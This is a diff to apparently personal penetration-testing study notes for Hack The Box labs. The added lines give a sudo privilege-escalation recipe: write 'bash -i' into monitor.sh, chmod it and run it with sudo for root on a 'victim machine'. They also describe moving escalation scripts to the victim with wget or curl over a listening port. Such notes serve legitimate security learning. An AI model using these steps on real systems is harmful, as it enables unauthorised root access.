@@ -249,12 +249,13 @@ Response codes: `200` ok, `400` error, `500` server error, `300` is redirect
 - You can transfer these files on the machine and then run these scripts to gain privilidge escalation. The goal is to gain root access. 
 - You can create a new folder called personal and then a subdir stuff and place scripts there
 
-- We can also gain sudo level terminal access by running the file that has code to run an interactive bash terminal
+- We can also gain sudo level terminal access by running the file that has code to run an interactive bash terminal. This can be run on the victim machine
 - `echo "bash -i" > monitor.sh`
 - `ls`
 - `cat monitor.sh`
 - `ls -la`
 - `chmod +x monitor.sh`
+- `sudo /home/<userdir>/personal/stuff/monitor.sh` When you run this script you will get root access
 
 
 ## Hack the box
@@ -283,7 +284,7 @@ General steps:
 - Then you can type `cat user.txt` and `history` to look at all the commands the user has typed or `cat bash_history`
 - You can also type `sudo -l` this will tell you if your username requires a password to run it
 - Now the next step would be to somewho upload a file contaiing privilidge escalation script and then run it on the host to gain root access
-- Note that for example we can use `wget` or `curl` to download the file on our kali linux machine and then through the session created with the victim machne, the file can be transferred over the listening port. 
+- Note that for example we can use `wget` or `curl` to download the file on our kali linux machine and then through the session created with the victim machne, the file can be transferred over the listening port to the victim 
 
 
 
